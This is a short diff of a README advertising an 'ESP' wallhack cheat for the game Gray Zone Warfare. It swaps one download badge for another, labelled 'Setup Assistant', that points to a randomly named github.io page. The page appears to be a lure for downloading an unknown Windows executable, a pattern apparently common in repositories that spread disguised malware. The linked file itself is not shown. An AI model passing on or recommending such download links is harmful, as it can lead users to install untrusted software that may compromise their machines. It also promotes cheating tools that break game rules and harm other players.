@@ -4,12 +4,7 @@
 
 <h1 align="center">🎯 Gray Zone Warfare ESP Tool</h1>
 
-<p align="center">
-  <a href="https://gray-zone-warfare-esp-tool.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20Gray%20Zone%20Warfare%20ESP-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
-         alt="Download Gray Zone Warfare ESP Tool" style="width:540px; height:37px;" />
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://atafafakec57.github.io/.github/gray-zone-warfare-tool)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_07/2(2).webp.94229b2cdfaa3914a526d2814459d12a.webp" alt="Gray Zone Warfare ESP Tool Preview" width="800" />
